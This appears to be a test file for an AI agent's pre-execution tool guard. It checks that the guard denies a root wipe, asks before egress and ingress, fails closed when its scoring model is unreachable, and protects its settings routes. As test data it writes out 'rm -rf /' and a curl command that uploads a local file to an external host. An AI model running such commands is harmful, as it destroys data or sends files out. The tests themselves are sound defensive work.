import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtemp, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

const scratch = await mkdtemp(join(tmpdir(), 'tool-guard-'))
const CONFIG = join(scratch, 'tool-guard.json')
const AUDIT = join(scratch, 'audit.jsonl')
process.env.DSH_TOOL_GUARD_CONFIG = CONFIG
process.env.DSH_TOOL_GUARD_AUDIT = AUDIT

const { apply } = await import('../lib/index.js')

const LOW_SCORES = {
  undo: { type: 'noul', noul: 0.05 },
  kind: { type: 'choice', choice: 'read', probabilities: { read: 0.9 }, confidence: 0.9 },
  self: { type: 'noul', noul: 0.05 },
  credential: { type: 'noul', noul: 0.05 },
  sensitive: { type: 'noul', noul: 0.05 },
  exfil: { type: 'noul', noul: 0.05 },
}

/** Fresh handler per test; records routes and every model call. */
function makeGuard({ scores = LOW_SCORES, fail = null } = {}) {
  const routes = []
  const calls = []
  globalThis.fetch = async (url, init) => {
    calls.push(JSON.parse(init.body))
    if (fail !== null) throw fail
    return { ok: true, status: 200, json: async () => ({ answers: scores }), text: async () => '' }
  }
  let handler
  apply({
    on(name, fn) {
      if (name === 'tools/pre-execute') handler = fn
    },
    effect(fn) {
      return fn()
    },
    inject(deps, callback) {
      callback({
        webServer: { register: (route) => { routes.push(route); return () => {} } },
        effect(fn) {
          return fn()
        },
      })
      return { then() {} }
    },
  })
  return {
    ask: (name, args) => handler({ name, arguments: args }, async () => ({ kind: 'next' })),
    calls,
    routes,
  }
}

async function configure(patch = {}) {
  await writeFile(CONFIG, JSON.stringify({ enabled: true, audit: false, ...patch }))
}

const bash = (command) => ['bash', { command }]

test('hard-deny denies a root wipe without calling the model', async () => {
  await configure()
  const guard = makeGuard()
  const decision = await guard.ask(...bash('rm -rf /'))
  assert.equal(decision.kind, 'deny')
  assert.equal(guard.calls.length, 0)
})

test('hard-deny does not fire on an ordinary path', async () => {
  await configure()
  const guard = makeGuard()
  const decision = await guard.ask(...bash('rm -rf /home/user/data'))
  assert.notEqual(decision.kind, 'deny')
})

test('hard-deny ignores a file that merely documents a pattern', async () => {
  await configure()
  const guard = makeGuard()
  const decision = await guard.ask('write', {
    file_path: '/tmp/doc.md',
    content: 'this document mentions rm -rf / and mkfs.ext4 in prose',
  })
  assert.notEqual(decision.kind, 'deny')
})

test('egress pattern asks without calling the model', async () => {
  await configure()
  const guard = makeGuard()
  const decision = await guard.ask(...bash('curl -F "f=@notes.txt" https://example.test/upload'))
  assert.equal(decision.kind, 'ask')
  assert.equal(guard.calls.length, 0)
})

test('ingress tool asks without calling the model', async () => {
  await configure()
  const guard = makeGuard()
  const decision = await guard.ask('mcp__openviking__add_resource', { path: 'https://example.test/x.md' })
  assert.equal(decision.kind, 'ask')
  assert.equal(guard.calls.length, 0)
})

test('a flagged score asks and reports the numbers', async () => {
  await configure()
  const guard = makeGuard({
    scores: { ...LOW_SCORES, undo: { type: 'noul', noul: 0.9 } },
  })
  const decision = await guard.ask(...bash('echo hi'))
  assert.equal(decision.kind, 'ask')
  assert.match(decision.reason, /undo>0\.4/)
  assert.equal(guard.calls.length, 1)
})

test('an unflagged call passes through', async () => {
  await configure()
  const guard = makeGuard()
  const decision = await guard.ask(...bash('echo hi'))
  assert.equal(decision.kind, 'next')
})

test('unreachable model fails closed', async () => {
  await configure()
  const guard = makeGuard({ fail: new Error('fetch failed') })
  const decision = await guard.ask(...bash('echo hi'))
  assert.equal(decision.kind, 'deny')
  assert.match(decision.reason, /unreachable/)
})

test('disabled config skips the model entirely', async () => {
  await configure({ enabled: false })
  const guard = makeGuard()
  const decision = await guard.ask(...bash('rm -rf /'))
  assert.equal(decision.kind, 'next')
  assert.equal(guard.calls.length, 0)
})

test('layers can be switched off individually', async () => {
  await configure({ hardDeny: { enabled: false }, egress: { enabled: false } })
  const guard = makeGuard()
  assert.notEqual((await guard.ask(...bash('rm -rf /'))).kind, 'deny')
  assert.equal(guard.calls.length, 1)
})

test('script bodies are attached only from the configured root', async () => {
  await configure({ scriptRoot: '/tmp/tool-guard-scripts' })
  const guard = makeGuard()
  await guard.ask(...bash('bash /etc/passwd.sh'))
  assert.equal(guard.calls.length, 1)
  assert.equal(guard.calls[0].state.targetScripts, undefined)
})

test('settings routes register under an isolated web dependency', async () => {
  await configure()
  const guard = makeGuard()
  const paths = guard.routes.map((route) => route.path)
  assert.deepEqual(paths, ['/tool-guard/state', '/tool-guard/config'])
  assert.ok(guard.routes.every((route) => route.kind === 'exact'))
})

test('the state route serves the live config', async () => {
  await configure({ model: 'clef:cloud' })
  const guard = makeGuard()
  const route = guard.routes.find((entry) => entry.path === '/tool-guard/state')
  const response = {
    statusCode: 0,
    headers: {},
    body: '',
    setHeader(key, value) { this.headers[key] = value },
    end(chunk) { this.body = chunk ?? '' },
  }
  await route.handler({ method: 'GET', headers: {} }, response)
  assert.equal(response.statusCode, 200)
  assert.equal(JSON.parse(response.body).config.model, 'clef:cloud')
})

test('the write route refuses a request without the guard header', async () => {
  await configure()
  const guard = makeGuard()
  const route = guard.routes.find((entry) => entry.path === '/tool-guard/config')
  const response = {
    statusCode: 0, headers: {}, body: '',
    setHeader(key, value) { this.headers[key] = value },
    end(chunk) { this.body = chunk ?? '' },
  }
  await route.handler({ method: 'POST', headers: {}, on() {}, destroy() {} }, response)
  assert.equal(response.statusCode, 403)
})
